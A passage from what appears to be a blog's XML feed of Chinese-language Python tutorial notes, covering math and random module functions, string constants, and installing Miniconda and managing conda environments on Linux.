class="hljs-operator">~</span><span class="hljs-operator">~</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><br>TypeError: <span class="hljs-string">&#x27;&gt;&#x27;</span> <span class="hljs-keyword">not</span> supported <span class="hljs-keyword">between</span> instances <span class="hljs-keyword">of</span> <span class="hljs-string">&#x27;tuple&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;list&#x27;</span><br></code></pre></td></tr></table></figure><p>参数为序列类型，返回值也是序列类型</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;&gt;&gt; <span class="hljs-built_in">max</span>(<span class="hljs-selector-attr">[3,6]</span>,<span class="hljs-selector-attr">[6,4]</span>)<br><span class="hljs-selector-attr">[6, 4]</span><br></code></pre></td></tr></table></figure><h3 id="min-x"><a href="#min-x" class="headerlink" title="min(x)"></a>min(x)</h3><p>返回给定参数的最小值，参数可以为序列，也就是list\tuple\ditc等</p><h3 id="modf-x"><a href="#modf-x" class="headerlink" title="modf(x)"></a>modf(x)</h3><p>返回给定参数的小数部分和整数部分，整数部分以浮点型展示，元组类型</p><p>需要导入math模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">xx = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">math.modf(xx)</span><br>(0.0, 1.0)<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">type</span>(math.modf(xx))</span><br>&lt;class &#x27;tuple&#x27;&gt;<br><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">yy = <span class="hljs-number">1.1111</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">math.modf(yy)</span><br>(0.11109999999999998, 1.0)<br></code></pre></td></tr></table></figure><h3 id="pow-x-y"><a href="#pow-x-y" class="headerlink" title="pow(x,y)"></a>pow(x,y)</h3><p>返回x**y的值，也就是x的y次幂</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">xx = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">yy = <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">pow</span>(yy,xx)</span><br>2<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">zz = <span class="hljs-number">4</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">pow</span>(yy,zz)</span><br>16<br></code></pre></td></tr></table></figure><h3 id="round-x-n"><a href="#round-x-n" class="headerlink" title="round(x[,n])"></a>round(x[,n])</h3><p>返回x的四舍五入值，如果存在n参数，则表示保留n位小数</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">xx = <span class="hljs-number">1.23456</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">round</span>(xx)</span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">round</span>(xx, <span class="hljs-number">3</span>)</span><br>1.235<br></code></pre></td></tr></table></figure><h3 id="sqrt-x"><a href="#sqrt-x" class="headerlink" title="sqrt(x)"></a>sqrt(x)</h3><p>返回数字x的平方根</p><p>需导入math模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">zz = <span class="hljs-number">4</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">math.sqrt(zz)</span><br>2.0<br></code></pre></td></tr></table></figure><h2 id="随机数函数"><a href="#随机数函数" class="headerlink" title="随机数函数"></a>随机数函数</h2><h3 id="choice-req"><a href="#choice-req" class="headerlink" title="choice(req)"></a>choice(req)</h3><p>返回参数req中随机值，req可以是列表、元组、字符串</p><p>需要导入random模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> random</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.choice(<span class="hljs-string">&quot;thisistest&quot;</span>)</span><br>&#x27;t&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.choice(<span class="hljs-string">&quot;thisistest&quot;</span>)</span><br>&#x27;t&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.choice(<span class="hljs-string">&quot;thisistest&quot;</span>)</span><br>&#x27;e&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.choice(<span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>))</span><br>8<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.choice(<span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>))</span><br>9<br></code></pre></td></tr></table></figure><h3 id="randrange-start-stop-step"><a href="#randrange-start-stop-step" class="headerlink" title="randrange([start,] stop [,step])"></a>randrange([start,] stop [,step])</h3><p>返回指定递增集合中的一个随机数，递增基数step默认是1</p><p>递增集合为[start, stop)，也就是包含start，不包含stop</p><p>需要导入random模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.randrange(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)</span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.randrange(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)</span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.randrange(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)</span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.randrange(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>)</span><br>9<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.randrange(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>)</span><br>3<br><br></code></pre></td></tr></table></figure><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><p>从[0,1)中返回随机一个实数</p><p>需要导入random模块</p><p>静态对象调用</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">&gt;&gt;&gt; <span class="hljs-built_in">random</span>.<span class="hljs-built_in">random</span>()<br><span class="hljs-number">0.4513311385549199</span><br>&gt;&gt;&gt; <span class="hljs-built_in">random</span>.<span class="hljs-built_in">random</span>()<br><span class="hljs-number">0.6301650234546455</span><br>&gt;&gt;&gt; <span class="hljs-built_in">random</span>.<span class="hljs-built_in">random</span>()<br><span class="hljs-number">0.27458340961261607</span><br></code></pre></td></tr></table></figure><h3 id="seed-x"><a href="#seed-x" class="headerlink" title="seed([x])"></a>seed([x])</h3><p>改变随机数生成器的种子，可以在调用其他随机模块函数之前调用此函数，设置后，使用random.random()生成的随机数是固定的</p><p>需要导入 random 模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"># 没有设置seed，每次生成的随机数都是随机的<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.random()</span><br>0.5780913011344704<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.random()</span><br>0.20609823213950174<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <br># 设置为同一个种子后，每次生成的随机数都是固定的<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.seed(<span class="hljs-number">1</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.random()</span><br>0.13436424411240122<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.seed(<span class="hljs-number">1</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.random()</span><br>0.13436424411240122<br><br># 更换种子后，生成的随机数会变化<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.seed(<span class="hljs-number">10</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.random()</span><br>0.5714025946899135<br></code></pre></td></tr></table></figure><h3 id="shuffle-序列"><a href="#shuffle-序列" class="headerlink" title="shuffle(序列)"></a>shuffle(序列)</h3><p>将序列中的元素随机排序</p><p>需要导入random模块</p><p>静态方法调用</p><p>返回值为 None</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> random</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">listtest = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.shuffle(listtest)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(random.shuffle(listtest))</span><br>None<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(listtest))</span><br>&lt;class &#x27;list&#x27;&gt;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(listtest)</span><br>[3, 1, 2]<br></code></pre></td></tr></table></figure><h3 id="uniform-x-y"><a href="#uniform-x-y" class="headerlink" title="uniform(x,y)"></a>uniform(x,y)</h3><p>生成指定范围内的实数，包含x和y</p><p>需要导入random模块</p><p>静态方法调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> random</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.uniform(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>)</span><br>2.8548840892555156<br></code></pre></td></tr></table></figure><h2 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h2><h2 id="数学常量"><a href="#数学常量" class="headerlink" title="数学常量"></a>数学常量</h2><h3 id="pi"><a href="#pi" class="headerlink" title="pi"></a>pi</h3><p>数学常量 pi（圆周率，一般以π来表示）</p><h3 id="e"><a href="#e" class="headerlink" title="e"></a>e</h3><p>数学常量 e，e即自然常数（自然常数）</p><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><p>单引号或双引号定义</p>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_module</title>
    <link href="/2024/11/11/dev/python3/python_module/"/>
    <url>/2024/11/11/dev/python3/python_module/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><h3 id="string-ascii-letters"><a href="#string-ascii-letters" class="headerlink" title="string.ascii_letters"></a>string.ascii_letters</h3><p>返回包含所有字母的字符串，包括大小写字母</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> string</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">string.ascii_letters</span><br>&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;<br></code></pre></td></tr></table></figure><h3 id="string-digits"><a href="#string-digits" class="headerlink" title="string.digits"></a>string.digits</h3><p>返回包含所有数字的字符串</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi">&gt;&gt;&gt; <span class="hljs-keyword">string</span>.digits<br><span class="hljs-string">&#x27;0123456789&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-keyword">type</span>(<span class="hljs-keyword">string</span>.digits)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="string-punctuation"><a href="#string-punctuation" class="headerlink" title="string.punctuation"></a>string.punctuation</h3><p>返回包含所有标点符号的字符串</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&gt;&gt;&gt; string.punctuation<br>&#x27;!&quot;#$%&amp;\&#x27;<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>*<span class="hljs-punctuation">+</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">-</span>./<span class="hljs-punctuation">:</span><span class="hljs-punctuation">;</span>&lt;<span class="hljs-punctuation">=</span>&gt;?@[\\]^_`&#123;<span class="hljs-string">|&#125;~&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>python</tag>
      
      <tag>tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_env</title>
    <link href="/2024/11/11/dev/python3/python_env/"/>
    <url>/2024/11/11/dev/python3/python_env/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Anaconda"><a href="#Anaconda" class="headerlink" title="Anaconda"></a>Anaconda</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Anaconda是一个开源的Python包管理器，而Miniconda则是轻量级的Anaconda</p><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>最新版本：<a href="https://docs.conda.io/en/latest/miniconda.html">https://docs.conda.io/en/latest/miniconda.html</a></p><p>历史版本：<a href="https://repo.anaconda.com/miniconda/">https://repo.anaconda.com/miniconda/</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Linux-环境"><a href="#Linux-环境" class="headerlink" title="Linux 环境"></a>Linux 环境</h3><p>wget <a href="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh">https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh</a></p><p>chmod +x Miniconda3-latest-Linux-x86_64.sh</p><p>.&#x2F;Miniconda3-latest-Linux-x86_64.sh</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">[root@<span class="hljs-number">10</span> tmp]# chmod +x Miniconda3-latest-Linux-x86_64.sh<br>[root@<span class="hljs-number">10</span> tmp]# ./Miniconda3-latest-Linux-x86_64.sh<br><br>Welcome <span class="hljs-keyword">to</span> Miniconda3 py313_25.<span class="hljs-number">3.1</span>-<span class="hljs-number">1</span><br><br><span class="hljs-keyword">In</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span> the installation process, please review the license<br>agreement.<br>Please, press ENTER <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span><br>&gt;&gt;&gt; yes<br>MINICONDA <span class="hljs-keyword">END</span> USER LICENSE AGREEMENT<br><br>Copyright Notice: Miniconda(R) (C) <span class="hljs-number">2015</span>, Anaconda, Inc.<br>All rights reserved. Miniconda(R) <span class="hljs-built_in">is</span> licensed, <span class="hljs-built_in">not</span> sold.<br><br>Redistribution <span class="hljs-built_in">and</span> use <span class="hljs-keyword">in</span> source <span class="hljs-built_in">and</span> <span class="hljs-keyword">binary</span> forms, <span class="hljs-keyword">with</span> <span class="hljs-built_in">or</span> without modification, are permitted provided that the follo<br>wing conditions are met:<br><br><span class="hljs-number">1</span>. Redistributions <span class="hljs-keyword">of</span> source code must retain the above copyright notice, this list <span class="hljs-keyword">of</span> conditions <span class="hljs-built_in">and</span> the following di<br>sclaimer;<br><br><span class="hljs-number">2</span>. Redistributions <span class="hljs-keyword">in</span> <span class="hljs-keyword">binary</span> form must reproduce the above copyright notice, this list <span class="hljs-keyword">of</span> conditions <span class="hljs-built_in">and</span> the following<br> disclaimer <span class="hljs-keyword">in</span> the documentation <span class="hljs-built_in">and</span>/<span class="hljs-built_in">or</span> other materials provided <span class="hljs-keyword">with</span> the distribution;<br><br><span class="hljs-number">3</span>. The name Anaconda, Inc. <span class="hljs-built_in">or</span> Miniconda(R) may <span class="hljs-built_in">not</span> be used <span class="hljs-keyword">to</span> endorse <span class="hljs-built_in">or</span> promote products derived <span class="hljs-keyword">from</span> this software w<br>ithout specific prior written permission <span class="hljs-keyword">from</span> Anaconda, Inc.; <span class="hljs-built_in">and</span><br><br><span class="hljs-number">4</span>. Miniconda(R) may <span class="hljs-built_in">not</span> be used <span class="hljs-keyword">to</span> access <span class="hljs-built_in">or</span> allow third parties <span class="hljs-keyword">to</span> access Anaconda package repositories <span class="hljs-keyword">if</span> such use w<br>ould circumvent paid licensing requirements <span class="hljs-built_in">or</span> <span class="hljs-built_in">is</span> otherwise restricted <span class="hljs-keyword">by</span> the Anaconda Terms <span class="hljs-keyword">of</span> Service.<br><br><span class="hljs-symbol">DISCLAIMER:</span> THIS SOFTWARE <span class="hljs-built_in">IS</span> PROVIDED <span class="hljs-keyword">BY</span> ANACONDA <span class="hljs-string">&quot;AS IS&quot;</span> <span class="hljs-built_in">AND</span> ANY EXPRESS <span class="hljs-built_in">OR</span> IMPLIED WARRANTIES, INCLUDING, BUT <span class="hljs-built_in">NOT</span> LI<br>MITED <span class="hljs-keyword">TO</span>, THE IMPLIED WARRANTIES <span class="hljs-keyword">OF</span> MERCHANTABILITY, FITNESS <span class="hljs-keyword">FOR</span> A PARTICULAR PURPOSE , <span class="hljs-built_in">AND</span> NON-INFRINGEMENT ARE DISCL<br>AIMED. <span class="hljs-keyword">IN</span> NO <span class="hljs-keyword">EVENT</span> SHALL ANACONDA BE LIABLE <span class="hljs-keyword">FOR</span> ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, <span class="hljs-built_in">OR</span> CONSEQUENTIAL<br> DAMAGES (INCLUDING, BUT <span class="hljs-built_in">NOT</span> LIMITED <span class="hljs-keyword">TO</span>, PROCUREMENT <span class="hljs-keyword">OF</span> SUBSTITUTE GOODS <span class="hljs-built_in">OR</span> SERVICES; LOSS <span class="hljs-keyword">OF</span> USE, DATA, <span class="hljs-built_in">OR</span> PROFITS; O<br>R BUSINESS INTERRUPTION) HOWEVER CAUSED <span class="hljs-built_in">AND</span> <span class="hljs-keyword">ON</span> ANY THEORY <span class="hljs-keyword">OF</span> LIABILITY, WHETHER <span class="hljs-keyword">IN</span> CONTRACT, <span class="hljs-keyword">STRICT</span> LIABILITY, <span class="hljs-built_in">OR</span> TORT<br> (INCLUDING NEGLIGENCE <span class="hljs-built_in">OR</span> OTHERWISE) ARISING <span class="hljs-keyword">IN</span> ANY WAY OUT <span class="hljs-keyword">OF</span> THE USE <span class="hljs-keyword">OF</span> MINICONDA(R), EVEN <span class="hljs-keyword">IF</span> ADVISED <span class="hljs-keyword">OF</span> THE POSSIBI<br>LITY <span class="hljs-keyword">OF</span> SUCH DAMAGE.<br><br><br><span class="hljs-keyword">Do</span> you accept the license terms? [yes|no]<br>&gt;&gt;&gt; yes<br><br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment"># 选择安装路径, 文件名前加点号表示隐藏文件</span><br><br>Miniconda3 will now be installed into this location:<br>/root/miniconda3<br><br>  - Press ENTER to confirm the <span class="hljs-keyword">location</span><br>  <span class="hljs-title">- Press</span> CTRL-C to abort the installation<br>  - <span class="hljs-keyword">Or</span> specify a different <span class="hljs-keyword">location</span> <span class="hljs-title">below</span><br><br>[/root/miniconda3] &gt;&gt;&gt; ~/.miniconda3<br><span class="hljs-attr">PREFIX=</span>/root/.miniconda3<br>Unpacking payload ...<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加配置信息到 ~/.bashrc文件</span><br>You can undo this by running `conda init --reverse <span class="hljs-variable">$SHELL</span>`? [<span class="hljs-built_in">yes</span>|no]<br>[no] &gt;&gt;&gt; <span class="hljs-built_in">yes</span><br>no change     /root/.miniconda3/condabin/conda<br>no change     /root/.miniconda3/bin/conda<br>no change     /root/.miniconda3/bin/conda-env<br>no change     /root/.miniconda3/bin/activate<br>no change     /root/.miniconda3/bin/deactivate<br>no change     /root/.miniconda3/etc/profile.d/conda.sh<br>no change     /root/.miniconda3/etc/fish/conf.d/conda.fish<br>no change     /root/.miniconda3/shell/condabin/Conda.psm1<br>no change     /root/.miniconda3/shell/condabin/conda-hook.ps1<br>no change     /root/.miniconda3/lib/python3.13/site-packages/xontrib/conda.xsh<br>no change     /root/.miniconda3/etc/profile.d/conda.csh<br>modified      /root/.bashrc<br></code></pre></td></tr></table></figure><p>重新加载环境变量文件或重启电脑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><p>测试是否安装成功</p><p>conda –version</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">(base) <span class="hljs-selector-attr">[root@10 tmp]</span># conda <span class="hljs-attr">--version</span><br>conda <span class="hljs-number">25.3</span><span class="hljs-selector-class">.1</span><br></code></pre></td></tr></table></figure><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="创建环境"><a href="#创建环境" class="headerlink" title="创建环境"></a>创建环境</h3><p>conda create -n condaName python&#x3D;版本</p><p>例如：</p><p>conda create -n open_manus python&#x3D;3.12</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Downloading and Extracting Packages:</span><br><br><span class="hljs-attr">Preparing transaction:</span> <span class="hljs-string">done</span><br><span class="hljs-attr">Verifying transaction:</span> <span class="hljs-string">done</span><br><span class="hljs-attr">Executing transaction:</span> <span class="hljs-string">done</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To activate this environment, use</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#     $ conda activate open_manus</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># To deactivate an active environment, use</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#     $ conda deactivate</span><br></code></pre></td></tr></table></figure><h3 id="激活环境"><a href="#激活环境" class="headerlink" title="激活环境"></a>激活环境</h3><p>conda activate condaName</p><p>例如：</p><p>conda activate open_manus</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@10</span> tmp]<span class="hljs-meta"># conda activate open_manus</span><br>(open_manus) [root<span class="hljs-symbol">@10</span> tmp]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="退出环境"><a href="#退出环境" class="headerlink" title="退出环境"></a>退出环境</h3><p>conda deactivate</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(open_manus) [root<span class="hljs-symbol">@10</span> tmp]<span class="hljs-meta"># conda deactivate</span><br>(base) [root<span class="hljs-symbol">@10</span> tmp]<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="查看当前环境中存在的虚拟环境"><a href="#查看当前环境中存在的虚拟环境" class="headerlink" title="查看当前环境中存在的虚拟环境"></a>查看当前环境中存在的虚拟环境</h3><p>conda env list </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">(base) [root@<span class="hljs-number">10</span> tmp]<span class="hljs-comment"># conda env list</span><br><br><span class="hljs-comment"># conda environments:</span><br><span class="hljs-comment">#</span><br>base                 * <span class="hljs-regexp">/root/</span>.miniconda3<br>open_manus             <span class="hljs-regexp">/root/</span>.miniconda3<span class="hljs-regexp">/envs/</span>open_manus<br></code></pre></td></tr></table></figure><p>或</p><p>conda info -e</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 